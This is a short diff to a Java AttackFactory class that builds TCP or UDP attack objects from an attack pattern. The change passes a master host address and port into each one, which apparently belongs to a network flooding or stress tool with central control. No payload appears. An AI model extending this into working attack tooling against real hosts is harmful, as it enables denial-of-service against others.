@@ -6,13 +6,13 @@ import protocols.implementation.UserDatagramProtocol;
 
 public class AttackFactory {
 
-    public static Protocol createAttack(AttackPattern attackPattern) {
+    public static Protocol createAttack(AttackPattern attackPattern, String masterAddress, int masterPort) {
         if(attackPattern.getProtocol().equalsIgnoreCase("tcp")) {
-            return new TransmissionControlProtocol(attackPattern);
+            return new TransmissionControlProtocol(attackPattern, masterAddress, masterPort);
         }else if(attackPattern.getProtocol().equalsIgnoreCase("udp")) {
-            return new UserDatagramProtocol(attackPattern);
+            return new UserDatagramProtocol(attackPattern, masterAddress, masterPort);
         }else {
-            return new TransmissionControlProtocol(attackPattern);
+            return new TransmissionControlProtocol(attackPattern, masterAddress, masterPort);
         }
     }
 }
